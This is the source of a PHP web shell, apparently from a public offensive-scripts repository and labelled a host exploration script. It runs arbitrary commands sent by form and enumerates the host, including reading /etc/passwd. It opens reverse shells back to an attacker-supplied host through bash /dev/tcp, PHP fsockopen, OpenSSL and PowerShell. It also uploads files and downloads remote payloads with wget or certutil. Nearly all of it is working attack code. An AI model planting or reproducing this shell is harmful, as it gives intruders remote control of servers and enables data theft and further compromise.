<!DOCTYPE html>
<!-- Simple host exploration script: basic host enumeration using PHP -->
<!-- https://github.com/isabellecda/cyber-scripts -->
<html>
	<b>
	<!-- Defines PHP function to sent the commands. Verifies disabled_functions. -->
	<?php
		// Check OS - Only Linux and Windows supported
		$os = php_uname('s');

		if("$os" != "Linux" and "$os" != "Windows") {
			echo 'Not supported, commands set for Linux';
			$os = "Linux";
		}

		echo "OS: $os -- ";

		// Check disabled functions
		function is_available($func) {
			$available = true;

			if (!is_callable($func)) {
			    $available = false;
			} else if (ini_get('safe_mode')) {
			    $available = false;
			} else {
			    $d = ini_get('disable_functions');
			    $s = ini_get('suhosin.executor.func.blacklist');
			    if ("$d$s") {
				$array = preg_split('/,\s*/', "$d,$s");
				if (in_array($func, $array)) {
				    $available = false;
				}
			    }
			}

			return $available;
		}

		// Flag to disable some functionality if no function is available
		$disabled = "";

		if(is_available('system')) {
			$cmdType = 'system';
		} else if(is_available('passthru')) {
			$cmdType = 'passthru';
		}  else if(is_available('shell_exec')) {
			$cmdType = 'shell_exec';
		}   else if(is_available('exec')) {
			$cmdType = 'exec';
		} else {
			$disabled = 'disabled';
		}

		echo 'Using PHP function: ';
		echo ($disabled == 'disabled') ? "Attention! Functions 'system', 'passthru', 'shell_exec' and 'exec' are disabled. Some buttons won't work." : $cmdType . '()';
	?>
	</b>
	<br><br>

	<!-- Commands sent using POST method-->
	<form  method="POST">
		Command:
		<input type="text" name="mycmd" placeholder="id" autofocus required <?php echo $disabled?>>
        	<input type="submit" name="btnPost" value="POST" <?php echo $disabled?>>
	</form>

	<br>

	<!-- Server enumeration -->
        <form  method="POST">
		Enumeration:
		<!-- Basic enum commands -->
		<input type="submit" name="btnEnum" value="Simple Enum" <?php echo $disabled?>>

		<!-- Executes PHP info -->
		<input type="submit" name="btnPhpInfo" value="phpinfo">
        </form>

	<br>

	<!-- Reverse shell -->
	<form  method="POST">
		Reverse Shell:
		<!-- Will try to get a reverse shell -->
		<!-- Handler must be listening at the defined host and port -->
		<input type="text" name="lhost" placeholder="192.168.0.1" size="15" required <?php echo $disabled?>>
		<input type="text" name="lport" placeholder="8000" size="5" required <?php echo $disabled?>>
		<input type="submit" name="btnSockets" value="Reverse Sockets" <?php echo $disabled?>>
		<input type="submit" name="btnPhp" value="Reverse PHP" <?php echo $disabled?>>
		<input type="submit" name="btnSSL" value="Reverse OpenSSL">
	</form>

	<br>

	<!-- Uploads file -->
	<form action="#" method="POST" enctype="multipart/form-data">
		PHP file upload: <input type="file" name="uploadedFile" />
		<input type="submit" name="btnMultipart" value="Send"/>
	</form>

	<br>

        <form  method="POST">
		File download using Remote HTTP Server:
		<!-- HTTP server must be available at the defined host and port -->
		<!-- File will be downloaded from the HTTP server (http://host:port/fileName) to the PHP server (/tmp/fileName) -->
		<input type="text" name="fileHost" placeholder="192.168.0.1"  size="15" required>
		<input type="text" name="filePort" placeholder="80" size="5" required>
		<input type="text" name="fileName" placeholder="example.txt" required>
		<input type="submit" name="btnWget" value="Sys Download" <?php echo $disabled?>>
		<input type="submit" name="btnPhpDownload" value="PHP Download">
	</form>
</html>
<?php
	// Client disconnect will not abort script
	ignore_user_abort(true);

	// Maximum execution time in seconds
	set_time_limit(8000);

	// Executes a system command and exit
	function exec_cmd_and_exit($type, $cmd) {
		echo "# $cmd";
	        echo '<br><br>';
		echo '<pre>';

		switch($type) {
			case 'passthru':
				passthru("$cmd 2>&1", $return_value);
			  	//($return_value == 0) or die();
				break;
			case 'shell_exec':
				echo (shell_exec("$cmd 2>&1"));
				break;
			case 'exec':
				exec("$cmd 2>&1", $array);
				foreach ($array as &$value) {
		    			echo ("$value \n");;
				}
				break;
			default:
				system("$cmd 2>&1", $return_value);
		  		($return_value == 0) or die();
		}

		echo '</pre>';
		exit();
	}

	echo '<br><hr><br>';

	// Default cmd exec
	if (isset($_REQUEST['btnPost']))
	{
		$cmd = $_REQUEST['mycmd'];
		exec_cmd_and_exit($cmdType, $cmd);
	}

	// Calls phpinfo()
	if (isset($_REQUEST['btnPhpInfo']))
	{
		phpinfo();
		exit();
	}

	// Command parameters
	$lhost = $_REQUEST['lhost'];
	$lport = $_REQUEST['lport'];

	$fileHost = $_REQUEST['fileHost'];
	$filePort = $_REQUEST['filePort'];
	$fileName = $_REQUEST['fileName'];

	// Verifies command buttons
	if (isset($_REQUEST['btnEnum'])) {
		$cmd = "$os" == Linux ?
			"echo -n 'whoami: '; whoami; echo -n '\nid: '; id ; echo -n '\npwd: '; pwd; echo '\ninterfaces:';ip a; echo '\nsystem users: ';cat /etc/passwd" : 
			"whoami; hostname; ver; systeminfo";

		exec_cmd_and_exit($cmdType, $cmd);
	}

	// Reverse Sockets
	if (isset($_REQUEST['btnSockets'])) {

		$winSocketShell = 'powershell.exe;$client = New-Object System.Net.Sockets.' . "TCPClient($lhost,$lport)" . ';$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' ;

		$cmd = "$os" == "Linux" ?
			"bash  -c '/bin/bash  -i > /dev/tcp/$lhost/$lport 0<&1 2>&1'" :
			'$winSocketShell';  // TODO: Check

		exec_cmd_and_exit($cmdType, $cmd);
	}

	// Reverse PHP
	if (isset($_REQUEST['btnPhp'])) {
        	$cmd = "php -r '\$sock=fsockopen(\"$lhost\",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'";
		exec_cmd_and_exit($cmdType, $cmd);
	}

	// Reverse OpenSSL
        if (isset($_REQUEST['btnSSL'])) {
		$randFile = rand(5, 100000);

		$cmd = "mkfifo /tmp/.$randFile; /bin/sh -i < /tmp/.$randFile 2>&1 | openssl s_client -quiet -connect $lhost:$lport> /tmp/.$randFile; rm /tmp/.$randFile" ;
                exec_cmd_and_exit($cmdType, $cmd);
        }

	// Process file upload
	if (isset($_REQUEST['btnMultipart'])) {
		$dir = '/tmp';

		// Multipart file
		$file = $_FILES['uploadedFile'];
		$uploadDest = "$dir/".$file['name'];

		// Moves file to /tmp folder
		if (move_uploaded_file($file['tmp_name'], $uploadDest)) { 
	    		echo "Success! Uploaded file can be found at $uploadDest"; 
		} 
		else { 
	    		echo 'Error. Could not upload file.'; 
		}

		exit();
	}

	// Process file download from HTTP Server
	$fileFrom = "http://$fileHost:$filePort/$fileName";

	$fileTo = "$os" == "Linux" ?
			"/tmp/$fileName" :
			"C:/Users/Public/Downloads/$fileName";

	if (isset($_REQUEST['btnWget'])) {
        	$cmd = "$os" == "Linux" ? 
			"wget $fileFrom -O $fileTo" : 
			"certutil -urlcache -split -f $fileFrom $fileTo"; // TODO: Check
		exec_cmd_and_exit($cmdType, $cmd);
    	}

	if (isset($_REQUEST['btnPhpDownload'])) {
		echo "# file_put_contents($fileTo, file_get_contents($fileFrom))";
		echo '<br><br>';
        	if (file_put_contents($fileTo, file_get_contents($fileFrom))) {
			echo "Success! Downloaded file can be found at $fileTo";
		} else {
			echo 'Error. Could not download file.';
		}
		exit();
    	}

?>
